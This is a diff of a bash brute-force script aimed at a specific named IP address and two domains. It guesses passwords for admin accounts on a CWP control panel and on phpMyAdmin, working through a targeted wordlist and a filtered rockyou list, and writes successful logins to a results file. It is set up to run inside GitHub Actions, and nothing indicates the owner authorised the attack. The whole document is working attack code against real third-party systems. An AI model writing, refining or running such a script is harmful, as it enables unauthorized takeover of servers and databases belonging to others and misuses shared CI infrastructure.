@@ -3,13 +3,14 @@
 # Target: 103.138.96.183 (enikah.in / abdemustafa.org)
 # Designed for GitHub Actions (6hr limit)
 
-set -e
-
 TARGET_IP="103.138.96.183"
 CWP_PORT=2083
 PMA_PORT=2031
 RESULTS_FILE="results.txt"
 LOG_FILE="bruteforce.log"
+
+> "$RESULTS_FILE"
+> "$LOG_FILE"
 
 log() {
     echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
@@ -25,9 +26,6 @@ check_cwp() {
     if echo "$resp" | grep -qi "success\|dashboard\|redirect\|welcome"; then
         return 0
     fi
-    if echo "$resp" | grep -qi "failed\|error\|invalid"; then
-        return 1
-    fi
     return 1
 }
 
@@ -41,62 +39,69 @@ check_pma() {
     if echo "$resp" | grep -qi "logout\|databases\|Browse\|logged_in"; then
         return 0
     fi
-    if echo "$resp" | grep -qi "Cannot log in\|Access denied\|denied"; then
-        return 1
-    fi
     return 1
 }
 
-log "=== Brute Force Started ==="
-log "Target: ${TARGET_IP}"
-log "CWP Port: ${CWP_PORT}, phpMyAdmin Port: ${PMA_PORT}"
-
 USERS=("root" "admin" "administrator" "webmaster" "cwp" "centos" "panel" "server")
 
-# Phase 1: Targeted wordlist
-log "=== Phase 1: Targeted Wordlist ($(wc -l < targeted.txt) passwords) ==="
-while IFS= read -r pass; do
-    for user in "${USERS[@]}"; do
-        if check_cwp "$user" "$pass"; then
-            log "*** CWP HIT: ${user}:${pass} ***"
-            echo "CWP HIT: ${user}:${pass}" >> "$RESULTS_FILE"
-            echo "***CWP***" >> "$RESULTS_FILE"
-        fi
-        if check_pma "$user" "$pass"; then
-            log "*** phpMyAdmin HIT: ${user}:${pass} ***"
-            echo "phpMyAdmin HIT: ${user}:${pass}" >> "$RESULTS_FILE"
-            echo "***PMA***" >> "$RESULTS_FILE"
-        fi
-        sleep 0.2
-    done
-done < targeted.txt
+log "=== Brute Force Started ==="
+log "Target: ${TARGET_IP}"
 
-# Phase 2: Filtered rockyou (8-16 chars, common patterns)
-log "=== Phase 2: Filtered Rockyou ==="
-if [ -f /usr/share/wordlists/rockyou.txt ]; then
-    # Filter: 8-16 chars, common patterns
-    grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' /usr/share/wordlists/rockyou.txt | \
-    head -50000 > /tmp/bruteforce/rockyou_filtered.txt
-    
-    log "Filtered rockyou: $(wc -l < /tmp/bruteforce/rockyou_filtered.txt) passwords"
-    
-    while IFS= read -r pass; do
-        for user in "${USERS[@]}"; do
-            if check_cwp "$user" "$pass"; then
-                log "*** CWP HIT: ${user}:${pass} ***"
-                echo "CWP HIT: ${user}:${pass}" >> "$RESULTS_FILE"
-                echo "***CWP***" >> "$RESULTS_FILE"
-            fi
-            if check_pma "$user" "$pass"; then
-                log "*** phpMyAdmin HIT: ${user}:${pass} ***"
-                echo "phpMyAdmin HIT: ${user}:${pass}" >> "$RESULTS_FILE"
-                echo "***PMA***" >> "$RESULTS_FILE"
-            fi
-            sleep 0.2
-        done
-    done < /tmp/bruteforce/rockyou_filtered.txt
+if [ "$PHASE" = "all" ] || [ "$PHASE" = "targeted" ] || [ -z "$PHASE" ]; then
+    if [ -f targeted.txt ]; then
+        COUNT=$(wc -l < targeted.txt)
+        log "=== Phase 1: Targeted Wordlist (${COUNT} passwords) ==="
+        while IFS= read -r pass; do
+            for user in "${USERS[@]}"; do
+                if check_cwp "$user" "$pass"; then
+                    log "*** CWP HIT: ${user}:${pass} ***"
+                    echo "CWP HIT: ${user}:${pass}" >> "$RESULTS_FILE"
+                fi
+                if check_pma "$user" "$pass"; then
+                    log "*** phpMyAdmin HIT: ${user}:${pass} ***"
+                    echo "phpMyAdmin HIT: ${user}:${pass}" >> "$RESULTS_FILE"
+                fi
+                sleep 0.2
+            done
+        done < targeted.txt
+    else
+        log "targeted.txt not found, skipping Phase 1"
+    fi
+fi
+
+if [ "$PHASE" = "all" ] || [ "$PHASE" = "rockyou" ]; then
+    ROCKYOU=""
+    if [ -f rockyou_filtered.txt ]; then
+        ROCKYOU="rockyou_filtered.txt"
+    elif [ -f /usr/share/wordlists/rockyou.txt ]; then
+        ROCKYOU="/usr/share/wordlists/rockyou.txt"
+    fi
+
+    if [ -n "$ROCKYOU" ]; then
+        log "=== Phase 2: Filtering rockyou ==="
+        grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' "$ROCKYOU" | head -50000 > /tmp/rockyou_filtered.txt
+        FILTERED_COUNT=$(wc -l < /tmp/rockyou_filtered.txt)
+        log "Filtered: ${FILTERED_COUNT} passwords"
+        
+        while IFS= read -r pass; do
+            for user in "${USERS[@]}"; do
+                if check_cwp "$user" "$pass"; then
+                    log "*** CWP HIT: ${user}:${pass} ***"
+                    echo "CWP HIT: ${user}:${pass}" >> "$RESULTS_FILE"
+                fi
+                if check_pma "$user" "$pass"; then
+                    log "*** phpMyAdmin HIT: ${user}:${pass} ***"
+                    echo "phpMyAdmin HIT: ${user}:${pass}" >> "$RESULTS_FILE"
+                fi
+                sleep 0.2
+            done
+        done < /tmp/rockyou_filtered.txt
+    else
+        log "No rockyou wordlist found, skipping Phase 2"
+    fi
 fi
 
 log "=== Brute Force Complete ==="
-log "Results: $(cat $RESULTS_FILE 2>/dev/null | wc -l) hits"
-cat "$RESULTS_FILE" 2>/dev/null || log "No results found"
+HITS=$(wc -l < "$RESULTS_FILE" 2>/dev/null || echo 0)
+log "Results: ${HITS} lines"
+cat "$RESULTS_FILE" 2>/dev/null
